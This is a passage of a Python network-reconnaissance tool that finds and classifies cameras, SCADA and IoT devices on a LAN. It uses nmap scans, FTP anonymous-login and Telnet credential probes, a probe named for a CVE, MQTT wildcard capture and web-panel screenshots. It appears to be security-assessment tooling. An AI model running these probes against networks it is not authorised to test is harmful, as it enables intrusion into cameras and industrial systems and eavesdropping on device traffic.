        if 3702 not in open_udp:
            tasks.append(('wsd', lambda: self.probe_ws_discovery(ip, 3702)))

        has_web = bool(open_tcp & {80, 89, 443, 8000, 8080, 8443, 8888})
        has_cam = bool(open_tcp & {554, 8554, 37777, 34567, 8000, 5000})

        # HTTP deep fingerprint — run for any device with web ports open.
        # probe_http_fingerprint runs all vendor checks concurrently internally.
        # Previously gated on is_interesting — but that created a chicken-and-egg
        # problem: unknown devices were never fingerprinted so they stayed Unknown.
        if has_web:
            for port in (80, 89, 8080, 8000, 443, 8443, 8888):
                if port in open_tcp:
                    tasks.append(
                        (f'fingerprint_{port}',
                         (lambda p=port: self.probe_http_fingerprint(ip, p)))
                    )
                    break  # one fingerprint attempt per device

        # ONVIF — try on any device with an HTTP port, not just confirmed cameras.
        # Many cameras only expose ports 80/8080 without RTSP showing up in scans.
        if has_web or has_cam:
            for port in (80, 8080, 8000):
                if port in open_tcp:
                    tasks.append(
                        ('onvif', (lambda p=port: self.probe_onvif(ip, p)))
                    )
                    break

        # FTP anonymous login + Telnet credential check — run whenever port is open.
        if 21 in open_tcp:
            tasks.append(('ftp', lambda: self.probe_ftp_anon(ip)))
        if 23 in open_tcp:
            tasks.append(('telnet',        lambda: self.probe_telnet_creds(ip)))
            tasks.append(('telnet_noauth', lambda: self.probe_telnet_noauth(ip)))
            tasks.append(('cve_24061',     lambda: self.probe_cve_2026_24061(ip)))

        # ── Run everything in a single pool ──────────────────────────────────
        results = {}
        if tasks:
            with ThreadPoolExecutor(max_workers=workers) as pool:
                future_to_key = {pool.submit(_run, fn): key for key, fn in tasks}
                for fut in as_completed(future_to_key):
                    key = future_to_key[fut]
                    val = fut.result()
                    if val:
                        results[key] = val

        return results


# ─────────────────────────────────────────────────────────────────────────────
# DEVICE CLASSIFIER
# ─────────────────────────────────────────────────────────────────────────────

# ── Printer keywords ─────────────────────────────────────────────────────────
_PRINTER_VENDOR_KW = [
    'hp', 'hewlett', 'canon', 'epson', 'brother', 'lexmark',
    'xerox', 'ricoh', 'kyocera', 'konica', 'minolta',
    'oki', 'sharp printer', 'toshiba tec', 'samsung printer',
]

# Ports that are so camera-specific that any one of them alone is conclusive.
# These are never used by routers, printers, or generic IoT devices.
_CAM_DEFINITIVE_PORTS = frozenset({
    554,    # RTSP — the single strongest camera indicator
    8554,   # RTSP alternate
    37777,  # Dahua proprietary TCP
    34567,  # Dahua / generic DVR TCP
    37778,  # Dahua RTSP
    8899,   # Swann / Zmodo DVR
    9527,   # Various DVR/NVR
    34599,  # Dahua mobile port
    34568,  # Dahua UDP discovery
    37020,  # Hikvision UDP discovery
})

# Ports that suggest a camera but are also used by other services (HTTP alt,
# Docker, Apple, etc.).  These contribute to scoring but are not conclusive alone.
_CAM_AMBIGUOUS_PORTS = frozenset({
    5000,   # Hikvision SDK (also Docker registry, Apple AirPlay)
    8000,   # Hikvision SDK alt (also a common HTTP alt port)
    1935,   # RTMP (camera live streams, but also OBS / media servers)
})


def classify_device(open_tcp: list, open_udp: list, vendor: str, probes: dict) -> str:
    """
    Two-tier camera classification:

    Tier 1 — definitive rules (skip scoring entirely):
      • Any _CAM_DEFINITIVE_PORTS open               → Camera/CCTV
      • RTSP or ONVIF probe succeeded                → Camera/CCTV
      • HTTP fingerprint confirmed a camera vendor   → Camera/CCTV

    Tier 2 — scoring for ambiguous cases:
      • _CAM_AMBIGUOUS_PORTS + vendor/probe evidence → scoring
      • Guard: vendor keyword alone (no camera port) → NOT enough for Camera
    """
    open_tcp_set = set(open_tcp)
    open_udp_set = set(open_udp)
    all_open     = open_tcp_set | open_udp_set
    vl           = vendor.lower()

    # ── Tier 0: Printer (checked first — unique port 9100 with PJL confirm) ──
    # A confirmed PJL banner on 9100 is definitive — no other device responds this way.
    # IPP port 631 + printer vendor keyword is also definitive.
    if 9100 in open_tcp_set and isinstance(probes.get('pjl'), dict) and probes['pjl'].get('alive'):
        return 'Printer'
    if 631 in open_tcp_set and any(kw in vl for kw in _PRINTER_VENDOR_KW):
        return 'Printer'
    _prt_score = 0
    if 9100 in open_tcp_set: _prt_score += 6
    if 631  in open_tcp_set: _prt_score += 3
    for kw in _PRINTER_VENDOR_KW:
        if kw in vl: _prt_score += 10; break
    _nmap_svcs_prt = probes.get('_nmap_svcs', {})
    if isinstance(_nmap_svcs_prt, dict):
        for _, _sv in _nmap_svcs_prt.items():
            if any(kw in _sv.lower() for kw in ('printer','jetdirect','cups','hpjd','pjl','ipp')):
                _prt_score += 8; break
    _snmp_prt = probes.get('snmp', {})
    if isinstance(_snmp_prt, dict):
        _desc_prt = (_snmp_prt.get('sysDescr') or _snmp_prt.get('sysdescr') or '').lower()
        if any(kw in _desc_prt for kw in ('printer','jetdirect','laserjet','officejet',
                                            'deskjet','cups','imagerunner','workcentre')):
            _prt_score += 8
    if _prt_score >= 14 and 9100 in open_tcp_set:
        return 'Printer'

    # ── Tier 1: definitive camera evidence ───────────────────────────────────

    # Definitive camera port open?
    if all_open & _CAM_DEFINITIVE_PORTS:
        return 'Camera/CCTV'

    # RTSP or ONVIF probe succeeded?
    if probes.get('rtsp') or probes.get('rtsp_alt') or probes.get('onvif'):
        return 'Camera/CCTV'

    # HTTP fingerprint confirmed a camera vendor?
    for key in probes:
        if key.startswith('fingerprint_'):
            fp = probes[key]
            if isinstance(fp, dict):
                fv = fp.get('vendor', '').lower()
                if any(kw in fv for kw in CAM_VENDOR_KW):
                    return 'Camera/CCTV'

    # ── Tier 2: scoring for ambiguous cases ──────────────────────────────────
    scada_score = cam_score = iot_score = 0

    for p in open_tcp + open_udp:
        if p in SCADA_PORTS_SET:       scada_score += 3
        if p in IOT_PORTS_SET:         iot_score   += 2
        if p in _CAM_AMBIGUOUS_PORTS:  cam_score   += 3  # ambiguous ports only

    for kw in SCADA_VENDOR_KW:
        if kw in vl: scada_score += 10; break
    for kw in CAM_VENDOR_KW:
        if kw in vl: cam_score   += 10; break
    for kw in IOT_VENDOR_KW:
        if kw in vl: iot_score   += 10; break

    scada_probes = {'modbus', 'iec104', 's7', 'enip', 'dnp3', 'bacnet', 'opc_ua'}
    iot_probes   = {'mqtt', 'mqtt_ssl', 'coap', 'upnp'}
    for p in probes:
        if p in scada_probes: scada_score += 5
        if p in iot_probes:   iot_score   += 5

    # SNMP sysDescr — fixes pre-existing key-case mismatch (stored as 'sysDescr')
    snmp = probes.get('snmp', {})
    if isinstance(snmp, dict):
        desc_raw = snmp.get('sysDescr') or snmp.get('sysdescr') or ''
        desc = desc_raw.lower()
        if desc:
            for kw in SCADA_VENDOR_KW:
                if kw in desc: scada_score += 8; break
            for kw in CAM_VENDOR_KW:
                if kw in desc: cam_score   += 8; break
            for kw in IOT_VENDOR_KW:
                if kw in desc: iot_score   += 8; break

    # Fingerprint vendor match (SCADA only — cam is already handled in Tier 1)
    for key in probes:
        if key.startswith('fingerprint_'):
            fp = probes[key]
            if isinstance(fp, dict):
                fv = fp.get('vendor', '').lower()
                for kw in SCADA_VENDOR_KW:
                    if kw in fv: scada_score += 8; break

    # HTTP probe server/title banners — nmap -sV often misses these
    for probe_key in probes:
        if probe_key.startswith('http_'):
            hp = probes[probe_key]
            if not isinstance(hp, dict):
                continue
            combined = (hp.get('server', '') + ' ' + hp.get('title', '')).lower()
            if not combined.strip():
                continue
            for kw in SCADA_VENDOR_KW:
                if kw in combined: scada_score += 6; break
            for kw in CAM_VENDOR_KW:
                if kw in combined: cam_score   += 6; break
            for kw in IOT_VENDOR_KW:
                if kw in combined: iot_score   += 6; break
            # Generic embedded-web hints → IoT
            if any(kw in combined for kw in ('router', 'gateway', 'access point',
                                              'wireless', 'modem', 'cpe', 'dsl')):
                iot_score += 4
            # Camera-specific words in page title / server
            if any(kw in combined for kw in ('camera', 'webcam', 'ipcam', 'ip cam',
                                              'dvr', 'nvr', 'cctv', 'surveillance')):
                cam_score += 6

    # SSH banner — Dropbear = embedded Linux IoT; vendor-specific strings = device type
    ssh = probes.get('ssh', {})
    if isinstance(ssh, dict):
        sw   = ssh.get('software', '').lower()
        hint = ssh.get('hint', '').lower()
        banner = ssh.get('banner', '').lower()
        combined_ssh = sw + ' ' + hint + ' ' + banner
        if 'dropbear' in combined_ssh:
            iot_score += 5   # Dropbear = embedded Linux router/IoT firmware
        if 'mikrotik' in combined_ssh or 'routeros' in combined_ssh:
            iot_score += 8
        if 'cisco' in combined_ssh:
            iot_score += 5   # Cisco switches/routers count as IoT/infrastructure
        if 'axis' in combined_ssh:
            cam_score += 8
        if any(kw in combined_ssh for kw in ('siemens', 's7', 'wincc', 'simatic')):
            scada_score += 8
        for kw in SCADA_VENDOR_KW:
            if kw in combined_ssh: scada_score += 6; break

    # nmap service product strings (pre-extracted by _probe_and_classify into _nmap_svcs)
    nmap_svcs = probes.get('_nmap_svcs', {})
    if isinstance(nmap_svcs, dict):
        for _, svc_str in nmap_svcs.items():
            sl = svc_str.lower()
            for kw in SCADA_VENDOR_KW:
                if kw in sl: scada_score += 5; break
            for kw in CAM_VENDOR_KW:
                if kw in sl: cam_score   += 5; break
            for kw in IOT_VENDOR_KW:
                if kw in sl: iot_score   += 5; break
            if any(kw in sl for kw in ('camera', 'webcam', 'dvr', 'nvr', 'rtsp')):
                cam_score += 5
            if any(kw in sl for kw in ('router', 'gateway', 'access-point',
                                        'wireless', 'broadband')):
                iot_score += 4

    # hostname hints (stored as _hostname by _probe_and_classify)
    hostname = probes.get('_hostname', '').lower()
    if hostname and hostname not in ('n/a', 'unknown', ''):
        if any(kw in hostname for kw in ('cam', 'camera', 'dvr', 'nvr',
                                          'hikvision', 'dahua', 'ipc', 'cctv')):
            cam_score += 6
        if any(kw in hostname for kw in ('plc', 'scada', 'hmi', 'rtu', 'ics',
                                          'siemens', 'rockwell', 'modbus')):
            scada_score += 6
        if any(kw in hostname for kw in ('router', 'gw', 'gateway', 'ap-',
                                          'wrt', 'tplink', 'netgear', 'asus',
                                          'mikrotik', 'dlink', 'linksys')):
            iot_score += 5

    # ── Tier 2 guard ─────────────────────────────────────────────────────────
    # Camera cannot win on vendor keyword alone when only generic ports are open.
    # Example: a device with ports 22/80/443 and a Hikvision OUI match scores
    # cam=10, iot=4 — but that is almost certainly a NVR/encoder with its web
    # panel on a standard port, NOT a confirmed camera stream.  Require at least
    # one ambiguous camera port to be open before allowing camera to win here.
    has_any_cam_port = bool(all_open & (_CAM_DEFINITIVE_PORTS | _CAM_AMBIGUOUS_PORTS))
    if not has_any_cam_port:
        cam_score = 0

    best = max(scada_score, iot_score, cam_score)
    if best == 0:
        return 'Unknown/Other'
    if cam_score == best and cam_score > 0:
        return 'Camera/CCTV'
    if scada_score == best:
        return 'SCADA/ICS'
    if iot_score == best:
        return 'IoT'
    return 'Unknown/Other'


# ─────────────────────────────────────────────────────────────────────────────
# MQTT CAPTURE
# ─────────────────────────────────────────────────────────────────────────────

def mqtt_capture(ip, port=1883, duration=10, max_msgs=30):
    """
    Connect to an open MQTT broker, subscribe to '#', and capture messages for
    `duration` seconds.  Returns list of {'topic': ..., 'payload': ...} or None.
    No external library needed — raw MQTT 3.1.1 packets over TCP.
    """
    GREEN  = '\033[1;32m'
    YELLOW = '\033[1;33m'
    RESET  = '\033[0m'

    def _encode_str(s):
        enc = s.encode('utf-8')
        return struct.pack('>H', len(enc)) + enc

    def _parse_remaining(buf, start):
        """Decode MQTT variable-length remaining length field. Returns (value, next_idx)."""
        mul = 1
        val = 0
        idx = start
        while idx < len(buf):
            byte = buf[idx]
            val += (byte & 0x7F) * mul
            mul *= 128
            idx += 1
            if not (byte & 0x80):
                break
        return val, idx

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(duration + 3)
        s.connect((ip, port))

        # MQTT CONNECT packet (protocol level 4 = MQTT 3.1.1, clean session, keepalive 60s)
        vh = b'\x00\x04MQTT\x04\x00\x00\x3c'  # protocol name, level, flags=0, keepalive=60
        client_id = _encode_str('fsec_recon')
        pkt_payload = client_id
        remaining = len(vh) + len(pkt_payload)
        connect_pkt = bytes([0x10, remaining]) + vh + pkt_payload
        s.sendall(connect_pkt)

        # Expect CONNACK (0x20 0x02 0x00 0x00)
        connack = s.recv(4)
        if len(connack) < 4 or connack[0] != 0x20 or connack[3] != 0x00:
            s.close()
            return None  # Connection refused or not an MQTT broker

        # SUBSCRIBE to '#' (all topics, QoS 0), packet ID = 1
        topic_filter = _encode_str('#')
        sub_payload = struct.pack('>H', 1) + topic_filter + b'\x00'
        remaining_sub = len(sub_payload)
        sub_pkt = bytes([0x82, remaining_sub]) + sub_payload
        s.sendall(sub_pkt)

        # Drain SUBACK
        s.settimeout(2)
        try:
            s.recv(8)
        except socket.timeout:
            pass

        # Capture PUBLISH messages
        messages = []
        buf = b''
        deadline = time.time() + duration
        s.settimeout(2)

        while time.time() < deadline and len(messages) < max_msgs:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
            except socket.timeout:
                continue
            except Exception:
                break

            # Parse all complete packets in buf
            while len(buf) >= 2:
                first_byte = buf[0]
                pkt_type = (first_byte >> 4) & 0x0F
                remaining_len, header_end = _parse_remaining(buf, 1)
                total_len = header_end + remaining_len

                if len(buf) < total_len:
                    break  # incomplete — wait for more data

                pkt_data = buf[header_end:total_len]
                buf = buf[total_len:]  # advance past this packet

                if pkt_type != 3:  # Not PUBLISH — skip
                    continue

                if len(pkt_data) < 2:
                    continue

                topic_len = struct.unpack('>H', pkt_data[:2])[0]
                if len(pkt_data) < 2 + topic_len:
                    continue

                topic_str = pkt_data[2:2 + topic_len].decode('utf-8', errors='replace')
                qos = (first_byte >> 1) & 0x03  # QoS from this packet's fixed header
                payload_start = 2 + topic_len + (2 if qos > 0 else 0)
                msg_payload = pkt_data[payload_start:]

                try:
                    payload_str = msg_payload.decode('utf-8', errors='replace')[:200]
                except Exception:
                    payload_str = msg_payload.hex()[:200]

                messages.append({'topic': topic_str, 'payload': payload_str})
                print(f"    {GREEN}[MQTT]{RESET} {topic_str}: {payload_str[:80]}")

        # MQTT DISCONNECT (0xe0 0x00)
        try:
            s.sendall(b'\xe0\x00')
        except Exception:
            pass
        s.close()
        return messages if messages else []

    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# SCREENSHOT CAPTURE
# ─────────────────────────────────────────────────────────────────────────────

class ScreenshotCapture:
    """
    Takes headless browser screenshots of HTTP/HTTPS pages.
    Uses the first available browser: Chromium → Chrome → Firefox.
    Screenshots saved as  <SCRIPT_DIR>/screenshots/<IP>_<port>.png
    """

    # Ports that warrant a screenshot
    WEB_PORTS = {80, 89, 443, 8080, 8443, 8000, 8888, 9000}
    HTTPS_PORTS = {443, 8443}

    def __init__(self, output_dir: str = None):
        # Save screenshots alongside the session results, not in the script dir.
        self.SCREENSHOT_DIR = os.path.join(output_dir or SCRIPT_DIR, 'screenshots')
        self.browser = self._find_browser()
        if self.browser:
            os.makedirs(self.SCREENSHOT_DIR, exist_ok=True)
            print(f"[+] Screenshot engine : {self.browser[1]}  →  {self.SCREENSHOT_DIR}")
        else:
            print("[~] No headless browser found — screenshots disabled.")
            print("    Install one of: chromium-browser, chromium, google-chrome, firefox")

    def _find_browser(self):
        """Return ('chrome'|'firefox', path) for first usable headless browser."""
        for name in ('chromium-browser', 'chromium', 'google-chrome',
                     'google-chrome-stable', 'chrome'):
            path = shutil.which(name)
            if path:
                return ('chrome', path)
        path = shutil.which('firefox')
        if path:
            return ('firefox', path)
        return None

    def capture(self, ip: str, port: int) -> str | None:
        """
        Capture a screenshot of http(s)://ip:port/.
        Returns the saved file path on success, None on failure.
        """
        if not self.browser:
            return None

        scheme = 'https' if port in self.HTTPS_PORTS else 'http'
        url    = f'{scheme}://{ip}:{port}/'
        fname  = os.path.join(self.SCREENSHOT_DIR, f'{ip}_{port}.png')

        kind, path = self.browser
        try:
            if kind == 'chrome':
                cmd = [
                    path,
                    '--headless=new',           # modern headless (Chrome 112+)
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-dev-shm-usage',
                    '--disable-extensions',
                    '--ignore-certificate-errors',
                    '--ignore-ssl-errors',
                    f'--screenshot={fname}',
                    '--window-size=1280,800',
                    '--hide-scrollbars',
                    '--timeout=10000',          # 10 s page load timeout
                    url,
                ]
            else:  # firefox
                cmd = [
                    path,
                    '--headless',
                    '--screenshot', fname,
                    '--window-size=1280,800',
                    url,
                ]

            proc = subprocess.run(
                cmd,
                timeout=20,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            if os.path.isfile(fname) and os.path.getsize(fname) > 500:
                return fname

        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

        # Clean up empty/broken file if created
        if os.path.isfile(fname) and os.path.getsize(fname) <= 500:
            try:
                os.remove(fname)
            except Exception:
                pass
        return None

    def capture_device(self, result: dict) -> dict:
        """
        Run capture() for all open web ports on a device.
        Returns dict: {port: filepath_or_None}
        """
        shots = {}
        for port in result.get('open_tcp', []):
            if port in self.WEB_PORTS:
                print(f"    [screenshot] {result['ip']}:{port} ...", end=' ', flush=True)
                path = self.capture(result['ip'], port)
                shots[port] = path
                print('OK' if path else 'failed')
        return shots


# ─────────────────────────────────────────────────────────────────────────────
# NETWORK SCANNER
# ─────────────────────────────────────────────────────────────────────────────

class NetworkScanner:

    def __init__(self, network: str, output_file: str = None, max_workers: int = 20,
                 probe_workers: int = 5, oui_file: str = None, screenshots: bool = True,
                 no_udp: bool = False, rootless: bool = False):
        self.network       = network
        self.max_workers   = max_workers   # parallel device scans
        self.probe_workers = probe_workers  # parallel probes per device
        self.no_udp        = no_udp        # skip UDP port scanning entirely
        self.rootless      = rootless      # no raw sockets: TCP connect scan only
        self.oui           = OUILookup(oui_file)
        self.prober        = ProtocolProber(PROBE_TIMEOUT)

        if not output_file:
            net_safe  = network.replace('/', '_').replace('.', '-')
            date_str  = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            output_file = os.path.join(SCRIPT_DIR, f'recon_{date_str}_{net_safe}.txt')
        self.output_file = output_file

        # Pass session output dir so screenshots land in <session>/screenshots/.
        self.screenshotter = ScreenshotCapture(os.path.dirname(self.output_file)) if screenshots else None

    # ── Phase 1: Host discovery ───────────────────────────────────────────────

    def discover_hosts(self):
        print(f"\n[*] Phase 1 — Host Discovery on {self.network}")
        hosts = []

        if SCAPY_AVAILABLE and not self.rootless:
            print("[*] ARP scan via scapy ...")
            try:
                pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.network)
                answered, _ = srp(pkt, timeout=3, retry=2, verbose=False)
                for _, rcv in answered:
                    hosts.append({'ip': rcv.psrc, 'mac': rcv.hwsrc.upper()})
                    print(f"    {rcv.psrc:<16}  {rcv.hwsrc.upper()}")
            except Exception as e:
                print(f"[!] scapy ARP failed: {e} — falling back to nmap")
                hosts = []

        if not hosts:
            # --unprivileged tells nmap to use TCP connect() for host discovery,
            # avoiding all raw/netlink socket calls. Required on Android where
            # uid=0 still lacks AF_NETLINK capability.
            ping_args = '-sn --unprivileged' if self.rootless else '-sn --send-eth'
            print(f"[*] nmap ping sweep ({ping_args}) ...")
            try:
                nm = nmap.PortScanner()
                nm.scan(hosts=self.network, arguments=ping_args)
                for h in nm.all_hosts():
                    mac = 'N/A'
                    try:
                        mac = nm[h]['addresses'].get('mac', 'N/A').upper()
                    except Exception:
                        pass
                    hosts.append({'ip': h, 'mac': mac})
                    print(f"    {h:<16}  {mac}")
            except Exception as e:
                print(f"[!] nmap ping scan failed: {e}")

        print(f"[*] {len(hosts)} live host(s) found.\n")
        return hosts

    # ── Fast triage pre-scan ──────────────────────────────────────────────────

    def _triage_scan(self, hosts: list) -> list:
        """Quick 12-port TCP connect scan to preview interesting hosts before full scan."""
        TRIAGE_PORTS = '21,22,23,80,443,445,502,554,1883,1911,2375,3389,4786,8000,8080,8291,8554,8888'
        ips = ' '.join(h['ip'] for h in hosts)
        unpriv = ' --unprivileged' if self.rootless else ''
        scan_args = f'-sT -n --open -p {TRIAGE_PORTS} --host-timeout 8s -T4{unpriv}'
        interesting = []
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=ips, arguments=scan_args)
            for ip in nm.all_hosts():
                ports = []
                for proto in nm[ip].all_protocols():
                    for port, info in nm[ip][proto].items():
                        if info.get('state') == 'open':
                            ports.append(port)
                if ports:
                    vendor = self.oui.lookup(
                        next((h.get('mac', 'N/A') for h in hosts if h['ip'] == ip), 'N/A')
                    )
                    interesting.append({'ip': ip, 'ports': sorted(ports), 'vendor': vendor})
        except Exception as e:
            print(f"[~] Triage scan failed: {e}")
        return interesting

    # ── Phase 2a: nmap scan only (runs serially — one at a time) ─────────────

    def _nmap_scan(self, host_info: dict):
        """Run nmap against one host and return parsed scan data. No probes."""
        ip     = host_info['ip']
        mac    = host_info.get('mac', 'N/A')
        vendor = self.oui.lookup(mac)

        tcp_str = ','.join(map(str, ALL_TCP_PORTS))
        if self.rootless:
            # Rootless: TCP connect scan only — no raw sockets, no OS detection
            # --unprivileged is required on Android where uid=0 still lacks AF_NETLINK
            port_spec  = f'T:{tcp_str}'
            scan_flags = '-sT -n --unprivileged '
            os_flags   = ''
        elif self.no_udp:
            port_spec  = f'T:{tcp_str}'
            scan_flags = '-sS -n '
            os_flags   = '-O --osscan-guess '
        else:
            udp_str    = ','.join(map(str, ALL_UDP_PORTS))
            port_spec  = f'T:{tcp_str},U:{udp_str}'
            scan_flags = '-sS -sU -n '
            os_flags   = '-O --osscan-guess '
        args = (
            f'{scan_flags}'
            f'-p {port_spec} '
            f'{os_flags}'
            f'-sV --version-intensity 5 '
            f'-T3 --open '
        )
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=ip, arguments=args)
        except Exception as e:
            print(f"    [!] nmap error on {ip}: {e}")
            return None

        if ip not in nm.all_hosts():
            return None

        hd = nm[ip]

        # Parse TCP
        open_tcp, tcp_svcs = [], {}
        for port, info in hd.get('tcp', {}).items():
            if info.get('state') == 'open':
                open_tcp.append(port)
                tcp_svcs[port] = {
                    'service':   info.get('name', ''),
                    'product':   info.get('product', ''),
                    'version':   info.get('version', ''),
                    'extrainfo': info.get('extrainfo', ''),
                }

        # Parse UDP
        # open_udp  = confirmed open (used for scoring + probing)
        # open_udp_display = open + open|filtered (shown in report only)
        open_udp, open_udp_display, udp_svcs = [], [], {}
        for port, info in hd.get('udp', {}).items():
            state = info.get('state', '')
            if state in ('open', 'open|filtered'):
                svc_entry = {
                    'service': info.get('name', ''),
                    'product': info.get('product', ''),
                    'version': info.get('version', ''),
                    'state':   state,
                }
                open_udp_display.append(port)
                udp_svcs[port] = svc_entry
                if state == 'open':          # only confirmed-open for scoring
                    open_udp.append(port)

        # OS fingerprint
        os_name, os_acc = 'Unknown', 0
        try:
            if hd.get('osmatch'):
                best = max(hd['osmatch'], key=lambda x: int(x.get('accuracy', 0)))
                os_name = best.get('name', 'Unknown')
                os_acc  = int(best.get('accuracy', 0))
        except Exception:
            pass

        # Hostname
        hostname = 'N/A'
        try:
            hostname = hd.hostname() or socket.getfqdn(ip) or 'N/A'
        except Exception:
            pass

        return {
            'ip':          ip,
            'mac':         mac,
            'vendor':      vendor,
            'hostname':    hostname,
            'os':          os_name,
            'os_acc':      os_acc,
            'open_tcp':    open_tcp,
            'open_udp':    open_udp,
            'open_udp_display': open_udp_display,
            'tcp_svcs':    tcp_svcs,
            'udp_svcs':    udp_svcs,
        }

    # ── Phase 2b: probes + classify (runs in parallel across devices) ─────────

    def _probe_and_classify(self, nmap_data: dict):
        """Take parsed nmap data, run protocol probes in parallel, classify."""
        ip       = nmap_data['ip']
        vendor   = nmap_data['vendor']
        open_tcp = nmap_data['open_tcp']
        open_udp = nmap_data['open_udp']

        # Quick classify → drives which deep probes to schedule
        pre_class = classify_device(open_tcp, open_udp, vendor, {})

        # Protocol probes (parallel within this device)
        probes = self.prober.run_probes(ip, set(open_tcp), set(open_udp),
                                        pre_class, workers=self.probe_workers)

        # Inject nmap service product strings so classify_device can score them.
        # nmap -sV fills tcp_svcs with 'product' and 'service' fields that often
        # directly name the vendor (e.g. "Hikvision IP Camera", "Modbus TCP").
        nmap_svcs = {}
        for port, svc in nmap_data.get('tcp_svcs', {}).items():
            parts = [svc.get('product', ''), svc.get('service', ''),
                     svc.get('extrainfo', '')]
            combined = ' '.join(p for p in parts if p).strip()
            if combined:
                nmap_svcs[port] = combined
        if nmap_svcs:
            probes['_nmap_svcs'] = nmap_svcs

        # Inject hostname for keyword-based scoring.
        hostname = nmap_data.get('hostname', '')
        if hostname and hostname != 'N/A':
            probes['_hostname'] = hostname

        # Final classification
        device_type = classify_device(open_tcp, open_udp, vendor, probes)

        return {
            'ip':          ip,
            'mac':         nmap_data['mac'],
            'vendor':      vendor,
            'hostname':    nmap_data['hostname'],
            'device_type': device_type,
            'os':          nmap_data['os'],
            'os_acc':      nmap_data['os_acc'],
            'open_tcp':    sorted(open_tcp),
            'open_udp':    sorted(nmap_data['open_udp_display']),
            'tcp_svcs':    nmap_data['tcp_svcs'],
            'udp_svcs':    nmap_data['udp_svcs'],
            'probes':      probes,
        }

    # ── Main run ─────────────────────────────────────────────────────────────

    def run(self):
        W = 76
        print('\n' + '=' * W)
        print(f"  LAN Recon — IoT / SCADA / Camera Discovery  v{VERSION}")
        print('=' * W)
        print(f"  Network : {self.network}")
        print(f"  Output  : {self.output_file}")
        print(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print('=' * W)

        start = datetime.now()

        hosts = self.discover_hosts()
        if not hosts:
            print("[!] No live hosts found. Exiting.")
            return

        # ── Fast triage pre-scan ─────────────────────────────────────────────
        if len(hosts) > 1:
            YELLOW = '\033[1;33m'
            RESET  = '\033[0m'
            print(f"[*] Fast triage — checking 12 key ports on {len(hosts)} host(s)...\n")
            triage = self._triage_scan(hosts)
            if triage:
                print(f"\n{YELLOW}[!] Triage — {len(triage)} host(s) with interesting ports:{RESET}")
                for t in triage:
                    svc_hints = []
                    for p in t['ports']:
                        label = PORT_LABEL.get(p, '')
                        svc_hints.append(f"{p}({label})" if label else str(p))
                    print(f"    {t['ip']:<16} {t['vendor'][:28]:<28}  {', '.join(svc_hints)}")
            else:
                print("[-] Triage — no devices with known IoT/SCADA/camera ports.")
            print()
            try:
                ans = _input_tty("[?] Continue with full deep scan? [Y/n]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                ans = 'y'
            if ans == 'n':
                print("Scan aborted by user.")
                return
            print()

        # ── Phase 2a: nmap scans — limited parallel pool ─────────────────────
        # Cap at 5 simultaneous nmap processes: fast enough for large networks,
        # avoids raw-socket/bandwidth contention that causes false negatives.
        NMAP_WORKERS = min(len(hosts), 25)
        print(f"[*] Phase 2a — nmap scanning {len(hosts)} host(s) "
              f"({NMAP_WORKERS} parallel)...\n")

        nmap_results = []
        lock = threading.Lock()
        counter = [0]

        def _nmap_with_progress(h):
            result = self._nmap_scan(h)  # do work first, then update progress
            with lock:
                counter[0] += 1
                idx = counter[0]
            total  = len(hosts)
            pct    = idx * 100 // total
            filled = idx * 20 // total
            bar    = '█' * filled + '░' * (20 - filled)
            print(f"    [{bar}] {pct:>3}% [{idx}/{total}] {h['ip']:<16}  "
                  f"vendor: {self.oui.lookup(h.get('mac', 'N/A'))}", flush=True)
            return result

        with ThreadPoolExecutor(max_workers=NMAP_WORKERS) as pool:
            futs = {pool.submit(_nmap_with_progress, h): h for h in hosts}
            for fut in as_completed(futs):
                data = fut.result()
                if data:
                    nmap_results.append(data)
        print(f"    [Phase 2a complete — {len(nmap_results)}/{len(hosts)} hosts responded]")

        if not nmap_results:
            print("[!] No hosts responded to nmap. Exiting.")
            return

        # ── Phase 2b: protocol probes — parallel across all devices ──────────
        # nmap is done; now fire probes for all devices simultaneously.
        # Each device gets its own inner thread pool (probe_workers threads).
        print(f"\n[*] Phase 2b — Probing {len(nmap_results)} host(s) "
              f"(up to {self.max_workers} parallel)...\n")

        results = []
        probe_total = len(nmap_results)
        probe_done  = [0]
        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futs = {pool.submit(self._probe_and_classify, d): d
                    for d in nmap_results}
            for fut in as_completed(futs):
                probe_done[0] += 1
                done   = probe_done[0]
                pct    = done * 100 // probe_total
                filled = done * 20 // probe_total
                bar    = '█' * filled + '░' * (20 - filled)
                ip     = futs[fut]['ip']
                r = fut.result()
                if r:
                    results.append(r)
                    dtype  = r['device_type']
                    probes_keys = list(r['probes'].keys())
                    print(f"    [{bar}] {pct:>3}% [{done}/{probe_total}]  "
                          f"{ip:<16}  {dtype:<14}  probes: {probes_keys}", flush=True)
                else:
                    print(f"    [{bar}] {pct:>3}% [{done}/{probe_total}]  "
                          f"{ip:<16}  (no data)", flush=True)
        print(f"    [Phase 2b complete — {probe_done[0]}/{probe_total}]")

        # Sort: SCADA → Camera → IoT → Other, then by IP
        order = {'SCADA/ICS': 0, 'Camera/CCTV': 1, 'IoT': 2, 'Unknown/Other': 3}
        results.sort(key=lambda x: (order.get(x['device_type'], 4), x['ip']))

        # Phase 3: Screenshots (sequential — browsers are heavy, no parallel needed)
        if self.screenshotter and self.screenshotter.browser:
            web_devices = [r for r in results
                           if any(p in ScreenshotCapture.WEB_PORTS for p in r['open_tcp'])]
            if web_devices:
                print(f"\n[*] Phase 3 — Screenshots ({len(web_devices)} device(s) with web ports)...")
                for r in web_devices:
                    shots = self.screenshotter.capture_device(r)
                    r['screenshots'] = shots
            else:
                print("\n[*] Phase 3 — No web ports found, skipping screenshots.")
        else:
            for r in results:
                r['screenshots'] = {}

        elapsed = (datetime.now() - start).total_seconds()
        self._write_report(results, start, elapsed)

        print(f"\n[+] Done in {elapsed:.1f}s — saved to: {self.output_file}")

